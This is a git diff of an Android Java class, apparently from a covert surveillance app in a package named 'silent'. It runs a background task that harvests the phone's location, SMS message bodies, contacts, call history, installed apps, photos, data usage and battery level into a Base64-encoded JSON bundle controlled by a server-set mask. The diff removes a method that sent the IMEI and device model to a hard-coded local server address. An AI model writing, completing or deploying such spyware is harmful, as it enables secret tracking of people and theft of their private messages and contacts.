@@ -12,34 +12,33 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.drawable.Drawable;
+import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.TrafficStats;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.BatteryManager;
-import android.os.Build;
+import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
-import android.telephony.TelephonyManager;
+import android.util.Base64;
 import android.util.Log;
 
-import java.io.BufferedReader;
-import java.io.DataOutputStream;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.File;
-import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.URL;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 
 import src.silent.models.ContactModel;
-import src.silent.models.Sms;
+import src.silent.models.SmsModel;
+import src.silent.utils.LocationHandler;
 
 /**
  * Created by all3x on 2/23/2018.
@@ -52,106 +51,102 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
     @Override
     protected Void doInBackground(Context... params) {
         // TODO: Get the mask from server
-        String mask = "00000000";
+        String mask = "10000000";
 
         this.params = params[0];
         //getAndroidIDModel();
 
+        JSONObject bulkData = new JSONObject();
 
         for (int i = 0; i < 8; i++) {
             if (mask.charAt(i) == '1') {
                 switch (i) {
                     case 0:
-                        getSmartphoneLocation();
+                        getSmartphoneLocation(bulkData);
                         break;
                     case 1:
-                        getMessages();
+                        getMessages(bulkData);
                         break;
                     case 2:
-                        getContacts();
+                        getContacts(bulkData);
                         break;
                     case 3:
-                        getCallHistory();
+                        getCallHistory(bulkData);
                         break;
                     case 4:
-                        getMobileDataUsage();
+                        getMobileDataUsage(bulkData);
                         break;
                     case 5:
-                        getInstalledApps();
+                        getInstalledApps(bulkData);
                         break;
                     case 6:
-                        getPhotosVideos();
+                        getPhotosVideos(bulkData);
                         break;
                     case 7:
-                        getBatteryLevel();
+                        getBatteryLevel(bulkData);
                         break;
                 }
             }
         }
+
         return null;
     }
 
-    private void getAndroidIDModel() {
-        String[] test = {"", "", ""};
-        try {
-            TelephonyManager telephonyManager = (TelephonyManager) params.
-                    getSystemService(Context.TELEPHONY_SERVICE);
-            test[0] = telephonyManager.getDeviceId();
-            test[1] = Build.MANUFACTURER;
-            test[2] = Build.MODEL;
-
-            URL url = new URL("http://192.168.1.24:58938/api/Service/Post");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setReadTimeout(10000);
-            conn.setConnectTimeout(15000);
-            conn.setRequestMethod("POST");
-            conn.setDoInput(true);
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/xml");
-
-            String body = "";
-
-            DataOutputStream output = new DataOutputStream(conn.getOutputStream());
-            output.write(body.getBytes());
-            output.flush();
-            output.close();
-
-            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-
-            conn.disconnect();
-
-            Log.d("IMEI_MODEL", test[0] + " " + test[1] + " " + test[2]);
-        } catch (SecurityException ex) {
-            Log.d("IMEI EXCEPTION", ex.getMessage());
-        } catch (MalformedURLException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void getSmartphoneLocation() {
+    private void getSmartphoneLocation(JSONObject bulkData) {
         LocationManager locationManager = (LocationManager)
                 params.getSystemService(Context.LOCATION_SERVICE);
         try {
-            Location location = null;
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+
+            if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
+                    120000) {
+                JSONObject locationData = new JSONObject();
+                locationData.put("Latitude",
+                        Base64.encodeToString(String.valueOf(location.getLatitude()).getBytes(),
+                                Base64.URL_SAFE));
+                locationData.put("Longitude",
+                        Base64.encodeToString(String.valueOf(location.getLongitude()).getBytes(),
+                                Base64.URL_SAFE));
+                bulkData.put("Location", locationData);
             } else {
-                location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
+                LocationHandler locationHandler = new LocationHandler();
+                Criteria criteria = new Criteria();
+                criteria.setAccuracy(Criteria.ACCURACY_COARSE);
+                criteria.setPowerRequirement(Criteria.POWER_LOW);
+                criteria.setAltitudeRequired(false);
+                criteria.setBearingRequired(false);
+                criteria.setSpeedRequired(false);
+                criteria.setCostAllowed(true);
+                criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
+                criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);
+
+                Looper.prepare();
+                locationManager.requestSingleUpdate(criteria, locationHandler, null);
+                Looper.loop();
+
+                JSONObject locationData = new JSONObject();
+                locationData.put("Latitude",
+                        Base64.encodeToString(locationHandler.getLatitude().getBytes(),
+                                Base64.URL_SAFE));
+                locationData.put("Longitude",
+                        Base64.encodeToString(locationHandler.getLongitude().getBytes(),
+                                Base64.URL_SAFE));
+                bulkData.put("Location", locationData);
             }
-            Double lat = location.getLatitude();
-            Double longg = location.getLongitude();
-            Log.d("IMEI EXCEPTION", "Latitudine " + lat +
-                    " Longitudine " + longg);
+
+
         } catch (SecurityException ex) {
             Log.d("Location EXCEPTION", ex.getMessage());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        } catch (Exception ex) {
+            Log.d("LOCATION EXCEPTION", ex.getMessage());
         }
     }
 
-    private void getMessages() {
-        List<Sms> lstSms = new ArrayList<>();
-        Sms objSms;
+    private void getMessages(JSONObject bulkData) {
+        List<SmsModel> lstSms = new ArrayList<>();
+        SmsModel objSmsModel;
         Uri message = Uri.parse("content://mms-sms/conversations/");
         ContentResolver cr = params.getContentResolver();
         Cursor c = cr.query(message, new String[]{"*"}, null, null,
@@ -161,29 +156,29 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         if (c.moveToFirst()) {
             for (int i = 0; i < totalSMS; i++) {
 
-                objSms = new Sms();
-                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
-                objSms.setAddress(c.getString(c
+                objSmsModel = new SmsModel();
+                objSmsModel.setId(c.getString(c.getColumnIndexOrThrow("_id")));
+                objSmsModel.setAddress(c.getString(c
                         .getColumnIndexOrThrow("address")));
-                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
-                objSms.setReadState(c.getString(c.getColumnIndex("read")));
+                objSmsModel.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
+                objSmsModel.setReadState(c.getString(c.getColumnIndex("read")));
                 Date date = new Date(Long.
                         parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
-                objSms.setTime(date.toString());
+                objSmsModel.setTime(date.toString());
                 if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
-                    objSms.setFolderName("inbox");
+                    objSmsModel.setFolderName("inbox");
                 } else {
-                    objSms.setFolderName("sent");
+                    objSmsModel.setFolderName("sent");
                 }
 
-                lstSms.add(objSms);
+                lstSms.add(objSmsModel);
                 c.moveToNext();
             }
         }
         c.close();
     }
 
-    private void getContacts() {
+    private void getContacts(JSONObject bulkData) {
         List<ContactModel> list = new ArrayList<>();
         ContentResolver contentResolver = params.getContentResolver();
         Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
@@ -230,7 +225,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getCallHistory() {
+    private void getCallHistory(JSONObject bulkData) {
         try {
             List<String> strings = new ArrayList<>();
 
@@ -278,13 +273,13 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getMobileDataUsage() {
+    private void getMobileDataUsage(JSONObject bulkData) {
         long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
         long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
         long totalTrafic = totalTraficReceived + totalTraficTransmitted;
     }
 
-    private void getInstalledApps() {
+    private void getInstalledApps(JSONObject bulkData) {
         PackageManager pm = params.getPackageManager();
         List<ApplicationInfo> packages = pm.getInstalledApplications(0);
         for (ApplicationInfo packageInfo : packages) {
@@ -303,7 +298,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getPhotosVideos() {
+    private void getPhotosVideos(JSONObject bulkData) {
         ContentResolver cr = params.getContentResolver();
         String[] filePathColumn = {MediaStore.Images.Media.DATA};
         Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, filePathColumn
@@ -338,7 +333,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         cur.close();
     }
 
-    private void getBatteryLevel() {
+    private void getBatteryLevel(JSONObject bulkData) {
         BroadcastReceiver batteryReceriver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
